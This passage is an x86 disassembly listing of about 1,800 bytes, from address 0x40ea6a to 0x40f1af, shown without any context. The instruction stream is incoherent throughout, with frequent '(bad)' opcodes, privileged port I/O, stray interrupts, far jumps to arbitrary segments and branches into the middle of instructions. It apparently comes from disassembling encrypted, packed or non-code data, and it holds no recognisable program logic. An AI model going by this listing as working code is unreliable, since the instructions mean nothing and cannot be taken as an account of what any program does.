  40ea6a:	jne    0x40ea5a
  40ea6c:	add    eax,0x636851d9
  40ea71:	cmp    ebp,esp
  40ea73:	cs mov dl,0x45
  40ea76:	adc    BYTE PTR [ebx-0x5fa4ce7d],dl
  40ea7c:	and    eax,0x93a7f1a7
  40ea81:	pop    ebp
  40ea82:	das    
  40ea83:	bound  eax,QWORD PTR [esi-0x2c]
  40ea86:	stos   DWORD PTR es:[edi],eax
  40ea87:	jmp    0x40eacd
  40ea89:	adc    al,0x28
  40ea8b:	lea    ecx,[edi-0x7f]
  40ea8e:	add    edi,DWORD PTR [edx+0x35]
  40ea91:	pop    edx
  40ea92:	jmp    0x49d3ded2
  40ea97:	popf   
  40ea98:	jb     0x40eac5
  40ea9a:	xchg   edi,eax
  40ea9b:	or     bl,BYTE PTR [eax+0x46]
  40ea9e:	sub    al,0xa9
  40eaa0:	popa   
  40eaa1:	inc    ebx
  40eaa2:	and    BYTE PTR [ebx-0x26],ch
  40eaa5:	outs   dx,BYTE PTR ds:[esi]
  40eaa6:	test   BYTE PTR [eax],ch
  40eaa8:	imul   al
  40eaaa:	shr    BYTE PTR [ebx+0x2e],cl
  40eaad:	cmp    eax,0x516a3cb
  40eab2:	pop    edx
  40eab3:	mov    BYTE PTR [ebx+0x68],bh
  40eab6:	add    edi,DWORD PTR [edx-0xa]
  40eab9:	mov    ch,0xb2
  40eabb:	sub    eax,0x2b615814
  40eac0:	jo     0x40eab1
  40eac2:	in     eax,0x6c
  40eac4:	fs inc ebx
  40eac6:	gs add ah,ch
  40eac9:	stos   BYTE PTR es:[edi],al
  40eaca:	popa   
  40eacb:	xchg   ebx,eax
  40eacc:	cmp    al,0x21
  40eace:	dec    eax
  40eacf:	imul   eax,ebx,0x312f6698
  40ead5:	push   ds
  40ead6:	jmp    0x40eb54
  40ead8:	mov    DWORD PTR [edi+edx*2+0x7cbbd38f],esp
  40eadf:	mov    ss,WORD PTR [ecx]
  40eae1:	xchg   esp,eax
  40eae2:	mov    fs,WORD PTR [ebp-0x6a]
  40eae5:	sub    eax,0xc87f08cc
  40eaea:	xor    eax,0x1e89ce9b
  40eaef:	or     DWORD PTR [eax+0x5c4e89d4],ebp
  40eaf5:	cdq    
  40eaf6:	dec    ebx
  40eaf7:	xchg   ebp,eax
  40eaf8:	cmp    DWORD PTR [edi+ecx*2],esi
  40eafb:	int    0xd9
  40eafd:	sub    DWORD PTR [ecx+0x64429cff],esi
  40eb03:	lods   al,BYTE PTR ds:[esi]
  40eb04:	aam    0x12
  40eb06:	popf   
  40eb07:	in     eax,dx
  40eb08:	inc    esp
  40eb09:	and    dl,BYTE PTR [edx+0x15]
  40eb0c:	stos   DWORD PTR es:[edi],eax
  40eb0d:	out    dx,eax
  40eb0e:	mov    al,0x1c
  40eb10:	mov    al,0xa3
  40eb12:	sub    al,0xb6
  40eb14:	and    al,0x4d
  40eb16:	inc    esi
  40eb17:	enter  0x6118,0x0
  40eb1b:	lods   al,BYTE PTR ds:[esi]
  40eb1c:	sbb    edx,DWORD PTR [ebx+0x46c82edc]
  40eb22:	cmp    edx,DWORD PTR [ebp+0x31c1b1eb]
  40eb28:	in     eax,dx
  40eb29:	mov    ecx,0xf521f3f0
  40eb2e:	test   DWORD PTR [ebx+edi*4+0x25276cfb],edi
  40eb35:	xor    eax,0x5c2493dd
  40eb3a:	or     eax,0x85881a7c
  40eb3f:	pushf  
  40eb40:	hlt    
  40eb41:	adc    DWORD PTR [ebp-0x52],ebp
  40eb44:	jp     0x40eafe
  40eb46:	xchg   edx,eax
  40eb47:	and    al,0x9d
  40eb49:	mov    bh,0x49
  40eb4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb4c:	xor    eax,0xb3441d3f
  40eb51:	add    eax,DWORD PTR [edi+ebp*1]
  40eb54:	mov    bh,0x78
  40eb56:	adc    eax,0x3271ec8b
  40eb5b:	sub    BYTE PTR [edi+0x3d],0xa8
  40eb5f:	adc    eax,0xe71e661c
  40eb64:	push   edi
  40eb65:	mov    edi,DWORD PTR [edi-0x14]
  40eb68:	aaa    
  40eb69:	fidiv  WORD PTR [ebp+0x323c4b34]
  40eb6f:	(bad)  
  40eb70:	pop    ecx
  40eb71:	mov    ch,0xc7
  40eb73:	scas   al,BYTE PTR es:[edi]
  40eb74:	xchg   edi,eax
  40eb75:	jmp    0xdbd8:0x3c55a8c8
  40eb7c:	loopne 0x40eb27
  40eb7e:	out    0xc6,eax
  40eb80:	cwde   
  40eb81:	enter  0x3f6d,0x5c
  40eb85:	or     DWORD PTR [esi+0x33],edi
  40eb88:	inc    edx
  40eb89:	mov    dh,al
  40eb8b:	mov    ebx,0xcdb6314b
  40eb90:	retf   
  40eb91:	mov    ah,0x5b
  40eb93:	xor    al,0x50
  40eb95:	push   0x31fbb545
  40eb9a:	xor    al,0xb7
  40eb9c:	sub    eax,0xd2d198cd
  40eba1:	jno    0x40ebb7
  40eba3:	push   ds
  40eba4:	stc    
  40eba5:	push   esi
  40eba6:	(bad)  
  40eba7:	dec    ebx
  40eba8:	(bad)  
  40eba9:	pop    esi
  40ebaa:	add    DWORD PTR [ebx],esp
  40ebac:	and    DWORD PTR [ebx+0x72c35293],0x18538bf3
  40ebb6:	inc    esp
  40ebb7:	(bad)  
  40ebb8:	(bad)  
  40ebb9:	mov    eax,ds:0xf778fa4
  40ebbe:	mov    bh,BYTE PTR [edi+0x4a]
  40ebc1:	lds    ecx,FWORD PTR [edx+0x3]
  40ebc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebc5:	cdq    
  40ebc6:	push   es
  40ebc7:	ins    DWORD PTR es:[edi],dx
  40ebc8:	inc    ebp
  40ebc9:	not    DWORD PTR [ebx-0x6e61fd97]
  40ebcf:	sbb    DWORD PTR [eax+ebx*2],ebp
  40ebd2:	and    BYTE PTR fs:[esp+ebp*1],0xc1
  40ebd7:	inc    esp
  40ebd8:	inc    esi
  40ebd9:	mov    edx,0xa6508c3
  40ebde:	repnz (bad) 
  40ebe0:	jbe    0x40eb86
  40ebe2:	stos   BYTE PTR es:[edi],al
  40ebe3:	je     0x40ec2b
  40ebe5:	js     0x40ebb4
  40ebe7:	mov    al,ds:0x228636b4
  40ebec:	cmp    al,0x7
  40ebee:	rcr    ebx,1
  40ebf0:	sbb    dh,cl
  40ebf2:	nop
  40ebf3:	jle    0x40ebc5
  40ebf5:	mov    fs,WORD PTR [edx+0x14]
  40ebf8:	lahf   
  40ebf9:	iret   
  40ebfa:	push   0xffffff98
  40ebfc:	and    eax,0xdd4834b3
  40ec01:	xor    DWORD PTR [esi-0x59],edi
  40ec04:	mov    esp,0x68095bec
  40ec09:	lahf   
  40ec0a:	jmp    0x40ec2c
  40ec0c:	mov    ds:0x5488033b,eax
  40ec11:	inc    eax
  40ec12:	cmp    ebx,DWORD PTR [ebx+0x62]
  40ec15:	add    cl,BYTE PTR [ebp-0x25]
  40ec18:	pop    edi
  40ec19:	out    dx,eax
  40ec1a:	(bad)  
  40ec1b:	ficom  DWORD PTR [ebx]
  40ec1d:	loopne 0x40ec6c
  40ec1f:	jb     0x40ebc7
  40ec21:	cmc    
  40ec22:	jo     0x40ec40
  40ec24:	jae    0x40ec37
  40ec26:	sahf   
  40ec27:	in     al,0x38
  40ec29:	xor    edx,esp
  40ec2b:	push   0x62ee94b1
  40ec30:	aas    
  40ec31:	dec    ebp
  40ec32:	out    0x35,al
  40ec34:	int3   
  40ec35:	fistp  QWORD PTR [esp+eax*2-0x520d49ec]
  40ec3c:	push   0xffffffec
  40ec3e:	or     dl,BYTE PTR [ecx]
  40ec40:	xchg   ebx,eax
  40ec41:	jno    0x40ebe6
  40ec43:	adc    BYTE PTR ds:0x9fee6784,dh
  40ec49:	xor    al,0x15
  40ec4b:	popa   
  40ec4c:	inc    ebx
  40ec4d:	jne    0x40ec09
  40ec4f:	push   esi
  40ec50:	add    al,0x96
  40ec52:	mov    ah,0xcf
  40ec54:	xor    al,BYTE PTR ds:0x47119ff2
  40ec5a:	ret    0x2226
  40ec5d:	cmp    BYTE PTR [eax+0x7c],bl
  40ec60:	push   ebp
  40ec61:	xchg   ebx,edx
  40ec63:	mov    eax,ds:0xd2eaa1ad
  40ec68:	faddp  st(2),st
  40ec6a:	outs   dx,BYTE PTR ds:[esi]
  40ec6b:	aas    
  40ec6c:	mov    cl,BYTE PTR [eax]
  40ec6e:	xor    ah,BYTE PTR gs:[ebx+0x2ff60646]
  40ec75:	clc    
  40ec76:	lock pop ss
  40ec78:	pop    edi
  40ec79:	dec    edi
  40ec7a:	mov    eax,0x6ed99921
  40ec7f:	sbb    esp,edi
  40ec81:	sbb    DWORD PTR [esi-0x17],0x4138d9c8
  40ec88:	aaa    
  40ec89:	stc    
  40ec8a:	adc    BYTE PTR [eax+edi*4-0x65],cl
  40ec8e:	mov    al,0x75
  40ec90:	pop    es
  40ec91:	shl    DWORD PTR [eax],cl
  40ec93:	iret   
  40ec94:	hlt    
  40ec95:	std    
  40ec96:	xchg   ebx,eax
  40ec97:	mov    esi,0x276a257
  40ec9c:	fld    DWORD PTR [edx-0x6]
  40ec9f:	or     al,0x53
  40eca1:	loopne 0x40ec88
  40eca3:	fwait
  40eca4:	je     0x40ec8b
  40eca6:	mov    edi,es
  40eca8:	lock mov BYTE PTR [edx],0xd9
  40ecac:	shr    DWORD PTR [edx-0x6d],cl
  40ecaf:	daa    
  40ecb0:	jno    0x40ecec
  40ecb2:	adc    dh,BYTE PTR [esi-0x5]
  40ecb5:	sub    ebp,DWORD PTR [eax+0x371d196d]
  40ecbb:	sub    DWORD PTR [edi+0x47],0x9b757c3e
  40ecc2:	sub    BYTE PTR [ebx*1+0x48c424dc],ah
  40ecc9:	loop   0x40ecf7
  40eccb:	mov    bh,0x2
  40eccd:	mov    ds:0xaa6ddbb7,eax
  40ecd2:	push   ds
  40ecd3:	imul   eax,DWORD PTR [ebx-0x65]
  40ecd7:	xor    BYTE PTR [esi+0x19],0x93
  40ecdb:	fs dec sp
  40ecde:	cdq    
  40ecdf:	les    esp,FWORD PTR [edi+0x2f]
  40ece2:	shl    BYTE PTR ds:0xa535dfc6,1
  40ece8:	pop    eax
  40ece9:	inc    eax
  40ecea:	int    0xbc
  40ecec:	dec    esi
  40eced:	je     0x40ecb4
  40ecef:	stc    
  40ecf0:	sub    ecx,DWORD PTR [ebx+0x4c]
  40ecf3:	dec    esp
  40ecf4:	out    0x43,al
  40ecf6:	fcomi  st,st(6)
  40ecf8:	loopne 0x40ece5
  40ecfa:	or     DWORD PTR [esi+0x5],esp
  40ecfd:	lock add al,0x93
  40ed00:	nop
  40ed01:	mov    WORD PTR [ecx],cs
  40ed03:	pop    esi
  40ed04:	jmp    0x40ece9
  40ed06:	imul   esi,DWORD PTR [eax-0x2d37cdcc],0xe4dc979d
  40ed10:	in     al,dx
  40ed11:	add    BYTE PTR [ebx-0x1d922a13],bh
  40ed17:	adc    eax,0x38b7fe56
  40ed1c:	call   0x70a167ad
  40ed21:	rol    BYTE PTR [eax-0xcac4b7b],1
  40ed27:	cwde   
  40ed28:	jae    0x40ed06
  40ed2a:	mov    ebx,0xdbecf70e
  40ed2f:	retf   
  40ed30:	ds push 0xfffffff1
  40ed33:	into   
  40ed34:	and    BYTE PTR [ebp-0x37a30dbb],0x9b
  40ed3b:	outs   dx,DWORD PTR ds:[esi]
  40ed3c:	pop    ebp
  40ed3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed3e:	lea    ebp,[esp+edi*4]
  40ed41:	aas    
  40ed42:	dec    esi
  40ed43:	inc    ebp
  40ed44:	cdq    
  40ed45:	dec    esi
  40ed46:	push   es
  40ed47:	outs   dx,DWORD PTR ds:[esi]
  40ed48:	ret    
  40ed49:	sub    ah,BYTE PTR [edx+0x3b]
  40ed4c:	jle    0x40edae
  40ed4e:	int3   
  40ed4f:	(bad)  
  40ed50:	or     edi,DWORD PTR [esi]
  40ed52:	fwait
  40ed53:	and    al,0xf1
  40ed55:	inc    ebp
  40ed56:	ja     0x40ed16
  40ed58:	daa    
  40ed59:	pop    ecx
  40ed5a:	jnp    0x40ed3e
  40ed5c:	popa   
  40ed5d:	push   ebx
  40ed5e:	jb     0x40ed28
  40ed60:	inc    ecx
  40ed61:	test   al,dh
  40ed63:	fadd   st,st(6)
  40ed65:	pop    eax
  40ed66:	jmp    0xc597:0xd251ca46
  40ed6d:	sar    DWORD PTR [eax],cl
  40ed6f:	enter  0xc3c0,0x7b
  40ed73:	and    eax,0x278d052e
  40ed78:	xchg   ebx,eax
  40ed79:	mov    cl,0x58
  40ed7b:	out    0x38,eax
  40ed7d:	jle    0x40ed62
  40ed7f:	dec    esp
  40ed80:	mov    BYTE PTR [ebx],0x7c
  40ed83:	enter  0xfe64,0x5f
  40ed87:	push   ebp
  40ed88:	mov    dl,0x86
  40ed8a:	add    al,0x7a
  40ed8c:	cmp    dl,BYTE PTR [edx+0x74]
  40ed8f:	rcr    dl,cl
  40ed91:	xor    cl,al
  40ed93:	ret    
  40ed94:	xchg   BYTE PTR [ebx],cl
  40ed96:	sub    al,bl
  40ed98:	or     eax,0x18903bbb
  40ed9d:	lahf   
  40ed9e:	jb     0x40ed4c
  40eda0:	sub    esp,DWORD PTR [esp+eax*1]
  40eda3:	fs pop edi
  40eda5:	mov    ch,0xc3
  40eda7:	aad    0x20
  40eda9:	arpl   WORD PTR [esi+0x27],di
  40edac:	sub    al,0xd0
  40edae:	inc    esp
  40edaf:	add    esi,ebp
  40edb1:	xchg   ecx,eax
  40edb2:	nop
  40edb3:	stc    
  40edb4:	and    dh,cl
  40edb6:	inc    ebx
  40edb7:	data16 (bad) 
  40edb9:	ja     0x40ed91
  40edbb:	or     al,0xc1
  40edbd:	mov    dh,0xde
  40edbf:	pop    eax
  40edc0:	out    dx,eax
  40edc1:	ja     0x40ede3
  40edc3:	jmp    0xa4b8:0xae9a85e6
  40edca:	or     eax,0x81464b15
  40edcf:	imul   eax,DWORD PTR [ebx+edx*4],0x1d8ae49d
  40edd6:	scas   al,BYTE PTR es:[edi]
  40edd7:	xor    al,0x50
  40edd9:	es mov ch,0xfd
  40eddc:	adc    dh,BYTE PTR [edi+0x43ad3dcf]
  40ede2:	(bad)  
  40ede3:	sub    al,0x40
  40ede5:	or     al,0xae
  40ede7:	stos   DWORD PTR es:[edi],eax
  40ede8:	push   0x3808856d
  40eded:	imul   edx,ebx,0xffffffbf
  40edf0:	cmc    
  40edf1:	inc    edi
  40edf2:	mov    ah,0xa4
  40edf4:	dec    esi
  40edf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edf6:	sar    esi,cl
  40edf8:	adc    al,0x97
  40edfa:	fsub   QWORD PTR [ebp+eiz*2-0x5c]
  40edfe:	inc    esi
  40edff:	pushf  
  40ee00:	icebp  
  40ee01:	cmp    DWORD PTR [esi+0x8c1ad3c],ebp
  40ee07:	dec    edx
  40ee08:	jmp    0x807f:0x7c796b72
  40ee0f:	push   es
  40ee10:	dec    ecx
  40ee11:	pop    ebp
  40ee12:	mov    esp,0xa04fb52a
  40ee17:	pop    edx
  40ee18:	rcr    DWORD PTR [eax+esi*1-0x75327e94],1
  40ee1f:	cli    
  40ee20:	push   edi
  40ee21:	ja     0x40eddc
  40ee23:	jg     0x40ede3
  40ee25:	jmp    0x68b89bb8
  40ee2a:	icebp  
  40ee2b:	call   0x811b:0xccd3be3a
  40ee32:	dec    ebp
  40ee33:	cmp    BYTE PTR [ebx+0x52a1471f],cl
  40ee39:	push   edi
  40ee3a:	stos   BYTE PTR es:[edi],al
  40ee3b:	lods   al,BYTE PTR ds:[esi]
  40ee3c:	jnp    0x40ee2b
  40ee3e:	in     eax,dx
  40ee3f:	fadd   st(4),st
  40ee41:	adc    bl,BYTE PTR [eax-0x24]
  40ee44:	ret    
  40ee45:	aam    0x38
  40ee47:	js     0x40edcc
  40ee49:	and    dh,0x28
  40ee4c:	(bad)  
  40ee4d:	push   ds
  40ee4e:	je     0x40ee3a
  40ee50:	xchg   edx,eax
  40ee51:	mov    ebp,0xe8c738b2
  40ee56:	sbb    DWORD PTR [esi],esp
  40ee58:	pop    esi
  40ee59:	cmc    
  40ee5a:	mov    cl,0xfc
  40ee5c:	jge    0x40eea2
  40ee5e:	inc    eax
  40ee5f:	pop    edi
  40ee60:	bound  esp,QWORD PTR [ecx-0xe2ad5a6]
  40ee66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee67:	inc    esp
  40ee68:	push   ds
  40ee69:	jnp    0x40ee67
  40ee6b:	pop    edi
  40ee6c:	adc    eax,0x6721dc4
  40ee71:	sbb    BYTE PTR [eax-0x5064bbc0],ch
  40ee77:	fst    QWORD PTR [edx+0x1f]
  40ee7a:	inc    ebx
  40ee7b:	and    bh,BYTE PTR [esi]
  40ee7d:	(bad)  
  40ee7e:	jmp    0x7d7ded1b
  40ee83:	call   0x401f:0x867b4220
  40ee8a:	inc    ebp
  40ee8b:	fisub  DWORD PTR [ebx-0x23df0793]
  40ee91:	test   BYTE PTR [ebp+0xe],al
  40ee94:	cmovp  eax,DWORD PTR [ebx-0x46be3ee9]
  40ee9b:	dec    edi
  40ee9c:	push   cs
  40ee9d:	pop    ds
  40ee9e:	repz add dh,dl
  40eea1:	(bad)  
  40eea2:	push   esp
  40eea3:	es out dx,eax
  40eea5:	pop    edi
  40eea6:	cdq    
  40eea7:	retf   0x5b69
  40eeaa:	retf   0x8042
  40eead:	imul   eax,DWORD PTR [esi+0x79],0x4c008dc5
  40eeb4:	loop   0x40eecf
  40eeb6:	or     DWORD PTR [eax+0x42],esp
  40eeb9:	icebp  
  40eeba:	fadd   QWORD PTR [edi]
  40eebc:	push   ss
  40eebd:	es add al,0x25
  40eec0:	fs xor al,0xea
  40eec3:	jae    0x40ee72
  40eec5:	aam    0x5e
  40eec7:	add    DWORD PTR [ecx],esp
  40eec9:	imul   ecx,DWORD PTR [edx],0x7f
  40eecc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eecd:	mov    esi,0x91eedc3e
  40eed2:	imul   DWORD PTR [ecx+0x1b]
  40eed5:	fldl2t 
  40eed7:	push   ebx
  40eed9:	retf   
  40eeda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eedb:	push   ecx
  40eedc:	cwde   
  40eedd:	int    0xc6
  40eedf:	in     eax,dx
  40eee0:	mov    WORD PTR [ebp-0x5f],ds
  40eee3:	jmp    0x40ef40
  40eee5:	add    ch,BYTE PTR [ecx+0x4837b9d0]
  40eeeb:	jns    0x40eea6
  40eeed:	jecxz  0x40ef0b
  40eeef:	push   edi
  40eef0:	lock sbb eax,0x11f134ab
  40eef6:	mov    eax,0x7d08a3b3
  40eefb:	dec    ebx
  40eefc:	and    dh,BYTE PTR [ebx]
  40eefe:	retf   
  40eeff:	mov    dh,0xf1
  40ef01:	in     eax,dx
  40ef02:	sbb    edx,edi
  40ef04:	pop    DWORD PTR [eax+0x10237a83]
  40ef0a:	idiv   DWORD PTR [eax]
  40ef0c:	fwait
  40ef0d:	xchg   edi,eax
  40ef0e:	rcr    BYTE PTR [esi+eax*8-0x4d],1
  40ef12:	out    0xfd,al
  40ef14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef15:	or     DWORD PTR ds:0x933d59d0,0xffffffa5
  40ef1c:	mov    al,ds:0x844c6d61
  40ef21:	inc    esi
  40ef22:	out    0x3e,al
  40ef24:	push   esp
  40ef25:	pop    ecx
  40ef27:	shl    BYTE PTR [esi-0xe6a8bb8],1
  40ef2d:	sbb    ebx,edx
  40ef2f:	cmp    ecx,esp
  40ef31:	enter  0x9375,0x95
  40ef35:	aad    0xff
  40ef37:	mov    fs,WORD PTR [edi-0x741df41c]
  40ef3d:	xor    BYTE PTR [ebx*1+0x28aef484],al
  40ef44:	or     BYTE PTR [eax],bh
  40ef46:	pop    es
  40ef47:	aaa    
  40ef48:	xchg   ecx,eax
  40ef49:	sti    
  40ef4a:	mov    bh,0x70
  40ef4c:	ss fwait
  40ef4e:	add    DWORD PTR [esi-0x734724d2],esp
  40ef54:	jl     0x40ef46
  40ef56:	int    0x42
  40ef58:	pop    edx
  40ef59:	cwde   
  40ef5a:	fadd   QWORD PTR [edi]
  40ef5c:	mov    dh,0x7a
  40ef5e:	jg     0x40ef79
  40ef60:	stos   BYTE PTR es:[edi],al
  40ef61:	adc    al,0xde
  40ef63:	push   cs
  40ef64:	push   ebx
  40ef65:	(bad)  
  40ef67:	mov    ds:0x9b711000,al
  40ef6c:	jecxz  0x40eefb
  40ef6e:	(bad)  
  40ef6f:	fstp   QWORD PTR ds:0xe7e115a8
  40ef75:	jmp    0xfb200d17
  40ef7a:	sti    
  40ef7b:	adc    esp,DWORD PTR [ebx+esi*4]
  40ef7e:	mov    ch,dh
  40ef80:	out    dx,al
  40ef81:	push   eax
  40ef82:	sbb    eax,0x7c54040a
  40ef87:	loopne 0x40ef5c
  40ef89:	sbb    eax,0x9b35bfce
  40ef8e:	ja     0x40ef99
  40ef90:	inc    eax
  40ef91:	fidiv  DWORD PTR [esi]
  40ef93:	cmovle ebp,DWORD PTR [esi+ebp*2-0x1a77ace9]
  40ef9b:	jge    0x40effc
  40ef9d:	outs   dx,BYTE PTR ds:[esi]
  40ef9e:	adc    BYTE PTR [ebp+eax*8-0x74],bl
  40efa2:	pop    ss
  40efa3:	and    cl,BYTE PTR [eax-0x56442165]
  40efa9:	test   al,0x25
  40efab:	shl    BYTE PTR [esi-0x1e6c55e8],1
  40efb1:	out    0xbb,eax
  40efb3:	repnz cmp al,0x1e
  40efb6:	xchg   DWORD PTR [ecx-0x67e0862],ecx
  40efbc:	ret    0xc42
  40efbf:	mov    BYTE PTR [ebx-0x347c6585],cl
  40efc5:	or     eax,0x42647653
  40efca:	dec    edi
  40efcb:	imul   ebp,DWORD PTR ds:0x6336d5cb,0x5572015c
  40efd5:	shl    DWORD PTR [ebx+0x52143f17],0xa2
  40efdc:	or     eax,0x586c2662
  40efe1:	push   cs
  40efe2:	and    DWORD PTR [esi-0x26be81f5],0xd82eef2b
  40efec:	int    0x98
  40efee:	xor    eax,0x93d0626c
  40eff3:	pop    ds
  40eff4:	jne    0x40efb6
  40eff6:	jbe    0x40f068
  40eff8:	xchg   edi,eax
  40eff9:	add    al,0xa8
  40effb:	jae    0x40f011
  40effd:	mov    ebp,ds
  40efff:	es cld 
  40f001:	mov    dh,0x8f
  40f003:	cmp    ch,al
  40f005:	in     al,0x45
  40f007:	(bad)  
  40f008:	fmulp  st(2),st
  40f00a:	out    0x9a,eax
  40f00c:	mov    eax,ds:0xac01155e
  40f011:	(bad)  
  40f012:	mov    dl,BYTE PTR [ebx-0x1c2c02b9]
  40f018:	scas   al,BYTE PTR es:[edi]
  40f019:	mov    dl,0xdf
  40f01b:	xchg   esp,eax
  40f01c:	fstp   DWORD PTR [edi]
  40f01e:	pusha  
  40f01f:	les    ebx,FWORD PTR [ebx+eax*8]
  40f022:	ss dec eax
  40f024:	pop    eax
  40f025:	add    BYTE PTR [eax],al
  40f027:	jo     0x40f04b
  40f029:	dec    esi
  40f02a:	cwde   
  40f02b:	dec    ecx
  40f02c:	out    dx,al
  40f02d:	ror    DWORD PTR [esi],cl
  40f02f:	cld    
  40f030:	xor    BYTE PTR [edx+0x18b757b6],al
  40f036:	sub    BYTE PTR [eax+0x7e4aadc8],al
  40f03c:	cli    
  40f03d:	push   edi
  40f03e:	js     0x40f02d
  40f040:	fnsetpm(287 only) 
  40f042:	sbb    al,0xb2
  40f044:	jns    0x40efd6
  40f046:	add    bh,BYTE PTR [edx]
  40f048:	lods   eax,DWORD PTR ds:[esi]
  40f049:	repz aam 0x7d
  40f04c:	sub    BYTE PTR [ebp-0x72],cl
  40f04f:	sub    al,0x1
  40f051:	leave  
  40f052:	and    edi,DWORD PTR [edx-0x2e]
  40f055:	mov    esp,0xce298ada
  40f05a:	push   esi
  40f05b:	pop    eax
  40f05c:	jge    0x40f083
  40f05e:	ss pop esi
  40f060:	cld    
  40f061:	dec    ebx
  40f062:	retf   
  40f063:	adc    DWORD PTR [edx-0x6c9eaf6f],esp
  40f069:	stc    
  40f06a:	scas   eax,DWORD PTR es:[edi]
  40f06b:	into   
  40f06c:	inc    esp
  40f06d:	out    dx,al
  40f06e:	mov    bh,0x38
  40f070:	add    ax,0x19e8
  40f074:	pusha  
  40f075:	cmc    
  40f076:	fiadd  WORD PTR [ebx+eiz*4+0x4ff12b22]
  40f07d:	aaa    
  40f07e:	repnz sub DWORD PTR [esi],eax
  40f081:	and    eax,DWORD PTR [edx-0x47]
  40f084:	xchg   edx,eax
  40f085:	cmp    ecx,0x36
  40f088:	mov    dh,0xa9
  40f08a:	mov    ds:0x47d8c004,al
  40f08f:	cld    
  40f090:	lods   al,BYTE PTR ds:[esi]
  40f091:	add    BYTE PTR [edx],dl
  40f093:	call   0x40b3:0xfe568b8d
  40f09a:	mov    ebx,0x32d16f9d
  40f09f:	adc    edx,DWORD PTR [ebx]
  40f0a1:	out    0x69,al
  40f0a3:	fsub   DWORD PTR [eax+0x26]
  40f0a6:	lds    edx,FWORD PTR [edi-0x628bb437]
  40f0ac:	lea    eax,[esp+eax*2-0xb8f9635]
  40f0b3:	push   cs
  40f0b4:	push   esi
  40f0b5:	mov    eax,DWORD PTR [ebp-0x65]
  40f0b8:	std    
  40f0b9:	dec    ebp
  40f0ba:	jne    0x40f12e
  40f0bc:	jns    0x40f04c
  40f0be:	js     0x40f053
  40f0c0:	ret    
  40f0c1:	mov    bh,0xa3
  40f0c3:	aaa    
  40f0c4:	pop    ss
  40f0c5:	test   BYTE PTR [edi],ah
  40f0c7:	mov    ah,0x67
  40f0c9:	sti    
  40f0ca:	fidivr WORD PTR [ecx]
  40f0cc:	cmp    esi,DWORD PTR ds:0xadd71d71
  40f0d2:	pop    ebp
  40f0d3:	ja     0x40f0e4
  40f0d5:	call   0xf0892963
  40f0da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0db:	sbb    eax,0xbec0c684
  40f0e0:	xchg   esi,eax
  40f0e1:	in     eax,dx
  40f0e2:	mov    esi,0xba4903b3
  40f0e7:	jmp    0x40f091
  40f0e9:	adc    eax,0x2a54edf3
  40f0ee:	inc    ecx
  40f0ef:	push   ss
  40f0f0:	retf   
  40f0f1:	jo     0x40f10a
  40f0f3:	push   ebx
  40f0f4:	addr16 mov al,ds:0xe749
  40f0f8:	out    0xc4,al
  40f0fa:	into   
  40f0fb:	push   edx
  40f0fc:	imul   ebx,DWORD PTR [ebp+0x68],0xffffffe2
  40f100:	lock jnp 0x40f085
  40f103:	(bad)  
  40f104:	gs sub eax,0x2a9d3299
  40f10a:	inc    ebp
  40f10b:	dec    eax
  40f10c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f10d:	call   0x31bd:0xc04ced49
  40f114:	jbe    0x40f171
  40f116:	loope  0x40f0bc
  40f118:	mov    cl,0x41
  40f11a:	stos   DWORD PTR es:[edi],eax
  40f11b:	push   edi
  40f11c:	push   cs
  40f11d:	test   eax,0x8ea577f9
  40f122:	repnz (bad) 
  40f124:	adc    bh,BYTE PTR [eax]
  40f126:	sar    dl,0x4e
  40f129:	scas   al,BYTE PTR es:[edi]
  40f12a:	jne    0x40f14b
  40f12c:	mov    ecx,0x3cfd3b91
  40f131:	xchg   edx,eax
  40f132:	(bad)  
  40f133:	push   edi
  40f134:	xchg   edi,eax
  40f135:	ret    0x3036
  40f138:	out    dx,al
  40f139:	xor    ah,BYTE PTR [ebx+0x9]
  40f13c:	sbb    esp,ebx
  40f13e:	mov    esi,0x7d45974e
  40f143:	jecxz  0x40f1b9
  40f145:	movq   QWORD PTR ss:[edi-0x6f],mm6
  40f14a:	add    cl,bh
  40f14c:	xchg   esp,eax
  40f14d:	pop    ebp
  40f14e:	sub    DWORD PTR [ebp+edi*1+0x3e],esi
  40f152:	sub    eax,0x8d48ac77
  40f157:	or     BYTE PTR [esp+edx*2],dl
  40f15a:	and    eax,DWORD PTR ds:0x1a5824ec
  40f160:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f161:	cmp    DWORD PTR [eax],ebp
  40f163:	dec    edx
  40f164:	inc    esp
  40f165:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f166:	lahf   
  40f167:	xor    al,0x6
  40f169:	retf   0xd06f
  40f16c:	or     al,0x3e
  40f16e:	cs pop ebp
  40f170:	es push 0x13609d06
  40f176:	dec    esi
  40f177:	dec    edi
  40f178:	dec    esi
  40f179:	inc    eax
  40f17a:	inc    edx
  40f17b:	repnz outs dx,BYTE PTR ds:[esi]
  40f17d:	dec    esp
  40f17e:	out    0xd9,eax
  40f180:	ror    dl,1
  40f182:	neg    DWORD PTR fs:[ebp+0x78]
  40f186:	rcl    DWORD PTR [ebx+0x3],1
  40f189:	jmp    DWORD PTR [eax-0x7d]
  40f18c:	mov    bh,dh
  40f18e:	push   ss
  40f18f:	jp     0x40f1eb
  40f191:	aad    0x16
  40f193:	pop    ss
  40f194:	xor    DWORD PTR [esi+edx*2+0x26],esi
  40f198:	xchg   edi,eax
  40f199:	cmp    edi,ecx
  40f19b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f19c:	in     al,0x68
  40f19e:	adc    eax,0x5b3176f9
  40f1a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1a4:	inc    edi
  40f1a5:	ret    0x1a06
  40f1a8:	fs jns 0x40f1d0
  40f1ab:	inc    esi
  40f1ac:	xchg   ecx,eax
  40f1ad:	xchg   esp,eax
  40f1ae:	xchg   esi,eax
  40f1af:	test   dh,bl
